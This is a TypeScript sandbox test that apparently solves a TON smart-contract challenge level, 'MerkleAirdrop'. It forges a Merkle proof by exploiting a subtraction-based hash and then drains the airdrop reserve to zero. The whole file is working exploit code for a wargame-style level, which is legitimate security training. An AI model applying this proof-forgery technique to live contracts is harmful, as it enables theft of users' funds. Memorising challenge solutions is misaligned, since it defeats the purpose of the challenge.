import { Blockchain, SandboxContract, TreasuryContract } from '@ton/sandbox';
import { Address, toNano, Dictionary, fromNano } from '@ton/core';
import { MerkleAirdrop } from '../wrappers/wrappers/MerkleAirdrop';
import { Exploit } from '../wrappers/wrappers/ExploitMerkleAirdrop';
import '@ton/test-utils';

// npx blueprint test MerkleAirdrop.spec.ts
describe('Airdrop', () => {
    let blockchain: Blockchain;

    let level: SandboxContract<MerkleAirdrop>;
    let exploit: SandboxContract<Exploit>;

    let player: SandboxContract<TreasuryContract>;
    let owner: SandboxContract<TreasuryContract>;

    beforeAll(async () => {
        blockchain = await Blockchain.create();
        player = await blockchain.treasury('player');
        owner = await blockchain.treasury('owner');

        level = blockchain.openContract(await MerkleAirdrop.fromInit());
        exploit = blockchain.openContract(await Exploit.fromInit());

        await exploit.send(
            player.getSender(),
            {
                value: toNano('0.05'),
            },
            {
                $$type: 'Deploy',
                queryId: 0n,
            },
        );
    });

    it('Exploit', async () => {
        const myLeaf = await exploit.getMyLeaf(player.address, 10000n);
        const startLeaf = await exploit.getMyLeaf(
            Address.parse('EQDaypwc_Jr8by-alaK4mntRu35_EhlMz60AOeSJRawcrNM0'),
            614n,
        );

        let startNodes = [];
        startNodes.push(3276839473039418448246626220846442448842246862622804046064860066224006800084n);
        startNodes.push(47247882347545520880400048062206626448448620004800866600228646060442282848824n);
        startNodes.push(17983245880419772846408460262448682866408688862244064640442682866626888428288n);
        let { proof, root, temp } = await getProof(startLeaf, startNodes);

        const startMerkleRoot = root;

        let myNodes = [];
        myNodes.push(myLeaf - temp[0]);
        myNodes.push(47247882347545520880400048062206626448448620004800866600228646060442282848824n);
        myNodes.push(17983245880419772846408460262448682866408688862244064640442682866626888428288n);
        ({ proof, root, temp } = await getProof(myLeaf, myNodes));

        expect(startMerkleRoot).toEqual(root);

        await level.send(
            player.getSender(),
            {
                value: toNano('1'),
            },
            {
                $$type: 'Claim',
                recipient: player.address,
                amount: 10000n,
                proofs: proof,
                proofLength: 3n,
            },
        );

        expect(await level.getReserve()).toEqual(0n);
        expect(await level.getIsSolved()).toEqual(true);

        async function getProof(leaf: bigint, nodes: bigint[]) {
            let i = 0;
            let temp = [];
            while (i < 3) {
                let node = nodes[i];
                let temp1 = leaf - node!!;
                let temp2 = node!! - leaf;
                leaf = leaf > node!! ? await exploit.getSha256(temp1) : await exploit.getSha256(temp2);
                i = i + 1;
                leaf > node!! ? temp.push(temp1) : temp.push(temp2);
            }

            const root = leaf;
            const proof = Dictionary.empty<bigint, bigint>().set(0n, nodes[0]).set(1n, nodes[1]).set(2n, nodes[2]);

            return { proof, root, temp };
        }
    });
});
